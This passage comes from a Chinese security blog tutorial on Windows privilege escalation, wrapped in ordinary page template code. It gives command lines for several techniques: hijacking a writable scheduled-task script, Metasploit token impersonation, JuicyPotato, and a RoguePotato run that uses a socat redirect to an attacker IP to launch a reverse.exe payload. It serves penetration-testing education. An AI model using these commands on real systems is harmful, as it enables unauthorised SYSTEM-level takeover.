+<pre class=" language-java"><code class="language-java">schtasks <span class="token operator">/</span>query <span class="token operator">/</span>fo LIST <span class="token operator">/</span>v
+</code></pre>
+<p>在PowerShell中执行过滤：</p>
+<pre class=" language-java"><code class="language-java">Get<span class="token operator">-</span>ScheduledTask <span class="token operator">|</span> where <span class="token punctuation">{</span>$_<span class="token punctuation">.</span>TaskPath <span class="token operator">-</span>notlike <span class="token string">"\Microsoft*"</span><span class="token punctuation">}</span> <span class="token operator">|</span> ft TaskName<span class="token punctuation">,</span>TaskPath<span class="token punctuation">,</span>State
+</code></pre>
+<p>假如我们使用如上方法查到了一个每分钟都以 SYSTEM 身份运行的powershell脚本—— C:\DevTools\CleanUp.ps1 。</p>
+<p>我们使用 accesschk.exe，看看有没有写入的权限：</p>
+<pre class=" language-java"><code class="language-java">C<span class="token operator">:</span>\PrivEsc\accesschk<span class="token punctuation">.</span>exe <span class="token operator">/</span>accepteula <span class="token operator">-</span>quvw user C<span class="token operator">:</span>\DevTools\CleanUp<span class="token punctuation">.</span>ps1
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/8c6967b13af8473283d2d8b88bfe8d0e.png"><br>更改一下C:\DevTools\CleanUp.ps1文件，增加一行内容：cmd.exe ：</p>
+<pre class=" language-java"><code class="language-java">echo cmd<span class="token punctuation">.</span>exe <span class="token operator">>></span> C<span class="token operator">:</span>\DevTools\CleanUp<span class="token punctuation">.</span>ps1
+</code></pre>
+<p>等待一会就好</p>
+<h2 id="不安全的-GUI-应用程序提权"><a href="#不安全的-GUI-应用程序提权" class="headerlink" title="不安全的 GUI 应用程序提权"></a>不安全的 GUI 应用程序提权</h2><p><strong>在某些版本的 Windows 中，用户可以获得使用管理员权限运行某些 GUI 应用的权限。通俗点说就是我们普通用户打开一个gui程序的时候，实际上是以管理员权限执行的。就有点类似linux里的suid提权？</strong></p>
+<p><strong>演示：</strong></p>
+<p><strong>我们登录user用户，启动这个画图软件：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/042cdbc2f35d4c3190e0ab57003e9c4f.png"></p>
+<p><strong>查看一下这个程序的权限：</strong></p>
+<pre class=" language-java"><code class="language-java">tasklist <span class="token operator">/</span>V <span class="token operator">|</span> findstr mspaint<span class="token punctuation">.</span>exe
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/b1bc5621c41d4a6586c6c64ce825d774.png"><br> <strong>在这个软件中， 单击”文件”，然后打开：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/b6440d71f5c9494ab1dcf68d578ae755.png"></p>
+<p><strong>导航栏中输入：</strong></p>
+<pre class=" language-java"><code class="language-java">file<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>c<span class="token operator">:</span><span class="token operator">/</span>windows<span class="token operator">/</span>system32<span class="token operator">/</span>cmd<span class="token punctuation">.</span>exe
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/ec0d30b4b02e4b0b84d135028c5ffc14.png"><br><strong>提权到admin：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/857fa147a7074103b1442466c8768a5d.png"></p>
+<h2 id="利用程序快捷方式进行提权"><a href="#利用程序快捷方式进行提权" class="headerlink" title="利用程序快捷方式进行提权"></a>利用程序快捷方式进行提权</h2><pre class=" language-java"><code class="language-java">C<span class="token operator">:</span>\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
+</code></pre>
+<p><strong>这个目录是存放我们常用软件快捷方式的目录，如果这个目录可写，我们就可以创建一个快捷方式，然后链接到一个exe文件，再等着管理员用户点击这个快捷方式之后，我们就可以以管理员的方式，来执行这个exe文件。<br>可以使用如下的vb脚本来成功一个快捷方式：</strong></p>
+<pre class=" language-vbnet"><code class="language-vbnet">Set oWS = WScript.CreateObject("WScript.Shell") 
+sLinkFile = "C:\Users\user\Desktop\reverse.lnk" 
+Set oLink = oWS.CreateShortcut(sLinkFile) 
+oLink.TargetPath = "xxx.exe" 
+oLink.Save
+</code></pre>
+<p>执行以后就会在桌面生成一个叫reverse的exe文件:</p>
+<p><img src="https://img-blog.csdnimg.cn/b10b30581f9e449f9139517a33f0b8a4.png"></p>
+<p>等待管理员点他以后就会以管理员的身份来执行我们的exe文件。</p>
+<h2 id="Msf-windows提权一条龙"><a href="#Msf-windows提权一条龙" class="headerlink" title="Msf windows提权一条龙"></a>Msf windows提权一条龙</h2><p><strong>Msf的shell中，自带一个提权命令:getsystem，可以用来提权，原理:</strong></p>
+<ol>
+<li>创建一个以system权限启动的程序，这个程序的作用是连接指定的命名管道。</li>
+<li>创建一个进程，并让进程创建命名管道。</li>
+<li>让之前的以system权限启动的程序启动并连接这个命名管道。</li>
+<li>利用ImpersonateNamedPipeClient()函数生成system权限的token。</li>
+<li>利用system权限的token启动cmd。</li>
+</ol>
+<p>(这里并没有提权成功，因为失败时它会详细的输出他的原理，我这里是为了让大家更明白它的这个过程原理):</p>
+<p><img src="https://img-blog.csdnimg.cn/b02f28c2da5a4f8b92e9e867b0ce727d.png"></p>
+<p><strong>除了msf shell的getsystem命令以外，Msf也为我们提供了提权的模块，在exploits/windows/local模块下，我们可以设置session的id来使用执行这些提权的模块：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/bfc2440d63a54d92852c1aecfebadcd6.png"></p>
+<p><strong>同样我们也可以在msf的shell中进行可用提权exp的探测枚举，msf为我们写好了这个功能， 用法·:</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/56b1c6f9c4644786b52a6eba5adf7058.png"><br>如上图，成功为我们枚举到了一个可用的exp</p>
+<h2 id="MS14-058"><a href="#MS14-058" class="headerlink" title="MS14-058"></a>MS14-058</h2><p><strong>造成此漏洞的原因是什么?</strong></p>
+<ul>
+<li>当 Windows 内核模式驱动程序无法正确地处理 TrueType 字体时会导致该漏洞。</li>
+<li>什么是 Windows 内核模式驱动程序 (win32k.sys)? Win32k.sys 是一个内核模式设备驱动程 序，是 Windows 子系统的内核部分。它包含窗口管理器，后者控制窗口显示;管理屏幕输出; 收集键盘、鼠标和其他设备的输入;以及将用户消息传递给应用程序。它还包含图形设备接口 (GDI)，后者是图形输出设备的功能库。最后，它用作另一驱动程序 (dxgkrnl.sys) 中实施的 DirectX 支持的包装程序。</li>
+<li>这是一个可以利用提权到超级用户的漏洞</li>
+</ul>
+<p><strong>影响的范围是什么?</strong></p>
+<ul>
+<li>Windows Server 2003 Service Pack 2， Windows Server 2003 x64 Edition， Windows Server 2003 SP2， Windows Vista Service Pack 2， Windows Vista x64 Edition Service Pack 2 ， Windows Server 2008 Service Pack 2， Windows Server 2008 Service Pack 2，， Windows 7 Service Pack 1， Windows Server 2008 R2(用于基于 x64 的系统)Service Pack 1， Windows 8， Windows 8.1， Windows Server 2012， Windows Server 2012 R2 ， Windows RT， Windows RT 8.1</li>
+</ul>
+<p><strong>演示:</strong></p>
+<p>我们通过msf拿到了shell:</p>
+<p><img src="https://img-blog.csdnimg.cn/9840751e9f744fd78fe5db793db73f16.png"></p>
+<p>可以看到权限为普通用户，并且session id为2:</p>
+<p><img src="https://img-blog.csdnimg.cn/b08f0972e5f3453bac2b9cf16c41cfc8.png"></p>
+<p>使用ms14-058模块，并进行参数配置后进行run执行即可：</p>
+<p><img src="https://img-blog.csdnimg.cn/45674a1804264cf3b9e312f768eb2502.png"></p>
+<h2 id="令牌窃取提权"><a href="#令牌窃取提权" class="headerlink" title="令牌窃取提权"></a>令牌窃取提权</h2><blockquote>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次 请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭 证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系 统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测 出令牌，而假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以 当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌 进行攻击。简单理解令牌就相当于你现实生活中的“身份证”</p>
+</blockquote>
+<p><strong>令牌种类:</strong></p>
+<ol>
+<li>访问令牌(Access Token):表示访问控制操作主体的系统对象 </li>
+<li>会话令牌(Session Token):是交互会话中唯一的身份标识符。 </li>
+<li>密保令牌(Security Token):又叫做认证令牌或硬件令牌，是一种计算机身份 校验的物理设备，例如U盾</li>
+</ol>
+<p><strong>Msf shell中的相关命令:</strong></p>
+<pre class=" language-java"><code class="language-java">use incognito 进入incognito模块
+list_tokens <span class="token operator">-</span>u 列出令牌
+impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span> 选择要窃取的账号
+</code></pre>
+<p><strong>同时，我们在外围渗透时获得的权限越大我们可列出得令牌数量就越多，下图是两个权限的对比图:</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/f0978d9ecd8446e895f8fcdb040f6456.png"></p>
+<p><strong>Administrator权限升级到system权限实例：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/872c2c13808f41d9beeeee43cf7cc8c2.png"></p>
+<h2 id="烂土豆提权-Juicy-Potato"><a href="#烂土豆提权-Juicy-Potato" class="headerlink" title="烂土豆提权-Juicy Potato"></a>烂土豆提权-Juicy Potato</h2><p><strong>Windows最常用提权方式之一:烂土豆提权：令牌模拟+令牌窃取这里先简单表述一下，为什么要搭配来用：</strong></p>
+<p>我们前面讲过，低权限的用户可以列出的令牌数量是不多的，可能并不可以 列出那些高权限的用户的令牌，而“烂土豆“可以帮我们列出system用户的令牌，列出令牌以后我们直接窃取使用，便可成功提权到system</p>
+<p><strong>烂土豆提权原理:</strong></p>
+<ul>
+<li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。 对这个认证过程使用中间人攻击(NTLM重放)，为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API调用实现的。 </li>
+<li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令 牌。一般大多数的服务型账户(IIS、MSSQL等)有这个权限，大多数用户级 的账户没有这个权限。</li>
+</ul>
+<p><strong>使用烂土豆提权需要SeImpersonatePrivilege权限与 SeAssignPrimaryToken权限其中的一个：</strong></p>
+<ul>
+<li><p>SeImpersonatePrivilege(身份验证后模拟客户端)，它是在Windows 2000 SP4 中引入的。</p>
+</li>
+<li><p>被分配此权限的用户是设备本地管理员组的成员和设备的本地服务帐户。除了这些用户和组 之外，以下组件也具有此用户权限:<br>由服务控制管理器组件对象模型 (COM) 服务器启动的 服务由 COM 基础结构启动并配置为在特定帐户下运行 。</p>
+</li>
+</ul>
+<ul>
+<li>现在我们知道哪些类型的用户拥有 此特权，但是用户使用这些特权获得什么了呢，每当为用户分配 SeImpersontatePrivilege时， 就允许该用户代表该用户运行程序以模拟客户端。这里就是对我们前面“一般大多数的服务型账户(IIS、MSSQL等)有这个权限”的一个方面的解释</li>
+</ul>
+<p><strong>使用烂土豆提权时，需要 CLSID。</strong></p>
+<pre class=" language-java"><code class="language-java">这个可以通过：https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>ohpe<span class="token operator">/</span>juicy<span class="token operator">-</span>potato<span class="token operator">/</span>blob<span class="token operator">/</span>master<span class="token operator">/</span>CLSID<span class="token operator">/</span>README<span class="token punctuation">.</span>md 中的GetCLSID<span class="token punctuation">.</span>ps1 中的powershell脚本进行获取
+</code></pre>
+<p><strong>获取完CLSID后:</strong></p>
+<p>当有SeImpersonate权限时。juicypotato的参数使用-t t<br>开有SeAssignPrimaryToken权限时。juicypotato的参数使用-t u</p>
+<p><strong>最终命令:</strong></p>
+<pre class=" language-java"><code class="language-java">JuicyPotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>t t <span class="token operator">-</span>p c<span class="token operator">:</span>\windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>l <span class="token number">1111</span> <span class="token operator">-</span>c <span class="token punctuation">{</span>CLSID<span class="token punctuation">}</span>
+</code></pre>
+<h2 id="Rogue-Potato提权"><a href="#Rogue-Potato提权" class="headerlink" title="Rogue Potato提权"></a>Rogue Potato提权</h2><p><strong>微软推出烂土豆补丁后，高版本 Windows DCOM 解析器不再允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。这样便无法控制 RPC 对特定 IP 端口进行通讯。</strong></p>
+<p><strong>RoguePotato 使用其他远程主机的 135 端口做转发，通过远程主机将数据传到本地伪造的 RPC 服务上。</strong></p>
+<p><strong>具体操作为：</strong></p>
+<ul>
+<li>Rogue Potato 指定远程 IP（攻击者 IP）指示 DCOM 服务器执行远程 OXID 查询</li>
+<li>在远程 IP 上，设置一个 “socat” 监听，用于将 OXID 解析请求重定向到一个假的 OXID RPC 服务器</li>
+<li>伪造的 OXID RPC 服务器实现了 ResolveOxid2 服务器过程，该过程将指向受控命名管道 [<br>ncacn_np:localhost/pipe/roguepotato [\pipe\epmapper] ]。</li>
+<li>DCOM 服务器连接到 RPC 服务器以执行 IRemUnkown2 接口调用。连接到命名管道时将执行身份验证，我们可以通过<br>RpcImpersonateClient () 模拟调用者。</li>
+</ul>
+<p><strong>简单点说就是对微软发布的针对 “烂土豆提权”的补丁的一个绕过，上面的绕过原理及更多的”土豆家族”提权原理和介绍都可以在这篇师傅的文章中找到：</strong><a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fy747c482c3331f">https://www.wangan.com/p/7fy747c482c3331f</a></p>
+<p><strong>补充：当我们运行RoguePotato.exe，我们可以让它在本地机器上启动该服务，或者我们可以在自己控制的 Windows 机器上启动它并让它到达那里如果我想在本地机器上使用解析器，我需要在我的机器上创建一个隧道，该隧道在 TCP 135 上接收并重定向回目标主机上的解析器</strong></p>
+<p><strong>利用socat 重定向器，将我们机器的135端口转发到 Windows 上的端口 9999：</strong></p>
+<pre class=" language-vbnet"><code class="language-vbnet">sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.13.80:9999
+</code></pre>
+<p><strong>这个提权漏洞与上一个比较类似，也是需要SeImpersonate权限与SeAssignPrimaryToken权限其中一个。也是需要获取的shell是服务型账户才可以触发，我们切换到一个服务型账户的shell来模拟实际可能遇到的情况进行实验</strong>：</p>
+<pre class=" language-vbnet"><code class="language-vbnet">PSExec64.exe -i -u "nt authority\local service" cmd.exe
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/d66d5b2cafe14c5a8fbdfb4467da66c7.png"></p>
+<p><strong>在服务型账户的shell中进行提权：</strong></p>
+<pre class=" language-vbnet"><code class="language-vbnet">RoguePotato.exe -r 10.2.7.109 -e "C:\PrivEsc\reverse.exe" -l 9999
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/80134b1a15f04945a96459daaeafafb1.png"><br><strong>成功以高权限执行reverse.exe：</strong><img src="https://img-blog.csdnimg.cn/c61e8f7b62d14a37bd9f43f119a64b29.png"></p>
+<h2 id="PrintSpoofer提权"><a href="#PrintSpoofer提权" class="headerlink" title="PrintSpoofer提权"></a>PrintSpoofer提权</h2><p><strong>PrintSpoofer提权原理：</strong></p>
+<blockquote>
+<p>整体思路其实也是通过中继获取SYSTEM令牌，再通过模拟令牌执行命令。</p>
+<p>另有区别的是在Potato提权中多数是通过利用RPC中继的方式，例如在Rotten<br>Potato中，通过CoGetInstanceFromIStorage 加载COM对象BITS<br>服务来使得以SYSTEM身份运行的BITS服务向攻击者监听的端口发起连接并进行NTLM认证,但是NTLM认证仍然需要被重放到RPC服务器(默认情况下是135端口)以构造对应的协商或者挑战包从而返回,以实现欺骗NT<br>AUTHORITY\SYSTEM帐户通过<br>NTLM向我们控制的TCP端点进行身份验证，最后通过AcquireCredentialsHandle和AcceptSecurityContext来完成身份验证过程并获取令牌，从而以高权限令牌指定运行进程</p>
+<p>CoGetInstanceFromIStorage会尝试从 “指定的 host:port” 加载 “指定对象“ 的实例（通过 CLSID<br>指定对象），BITS 的 CLSID 为 {4991d34b-80a1-4291-83b6-3328366b9097}</p>
+</blockquote>
+<p><strong>下图可以很清晰的看出Rotten Potato的攻击流程：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/f79279d7a847448cb336c416c4beef1c.png"></p>
+<p><strong>但是利用该接口在Windows 10上将不再适用，原因是可能由于OXID解析器有关，在调用IstorageTrigger::MarshalInterface已经省略RPC绑定字符串中的端口，其中port也就是我们的本地侦听器端口，这就意味着COM连接现在只允许在TCP端口135上使用，因此就无法实现中间人攻击，但是RPC不是可用于这种中继场景的唯一协议，这里PrintSpoofer提权中则是使用了非常经典的管道(pipe)</strong></p>
+<p><strong>上面的PrintSpoofer提权原理节选自下面这个链接，想知道更详细的原理可以去这个师傅写的文章(挺复杂的)：</strong><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254904">https://www.anquanke.com/post/id/254904</a></p>
+<p><strong>我们同样，也是要在一个服务型shell中进行操作：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/03b7696ac59049a39e355f2ee60fabee.png"></p>
+<p><strong>使用PrintSpoofer.exe进行提权利用，利用成功：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/bd889e0651604c6ba38e1f47f869a66b.png"></p>
+<h2 id="bypass-UAC提权"><a href="#bypass-UAC提权" class="headerlink" title="bypass UAC提权"></a>bypass UAC提权</h2><p><strong>这个uac是什么呢？可以举个例子，其实就是我们点某个应用程序的时候，会出现个弹窗来询问我们是否要允许应用对你的设备进行更改。下面是百度到的详情：</strong></p>
+<blockquote>
+<p>UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p>
+</blockquote>
+<p><strong>这里bypass uac有一种思路是我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</strong></p>
+<p><strong>bypass uac 的方式其实有数十种，我说一个一个说不过来了，有耐心的师傅可以看看下面这个师傅的文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1799452">https://cloud.tencent.com/developer/article/1799452</a></p>
+<p><strong>在msf的后渗透模块中，内置了bypass uac提权。或者我们也可以去github上找这个的利用工具，比如下面这个，它内置了几十种提权的方式：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<h2 id="一些window提权的辅助工具"><a href="#一些window提权的辅助工具" class="headerlink" title="一些window提权的辅助工具"></a>一些window提权的辅助工具</h2><ul>
+<li>winPEASany.exe</li>
+<li>Seatbelt.exe</li>
+<li>PowerUp.ps1</li>
+<li>SharpUp.exe</li>
+<li>wesng</li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wa1ki0g</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/07/10/%E6%B5%85%E8%B0%88windows%E6%8F%90%E6%9D%83/">http://example.com/2022/07/10/%E6%B5%85%E8%B0%88windows%E6%8F%90%E6%9D%83/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wa1ki0g</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/08/06/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87LSA%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="域渗透——绕过LSA保护机制总结">
+                        
+                        <span class="card-title">域渗透——绕过LSA保护机制总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="post-category">
+                                    内网安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/02/19/javaSec-Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="javaSec-Servlet的线程安全问题">
+                        
+                        <span class="card-title">javaSec-Servlet的线程安全问题</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Java安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
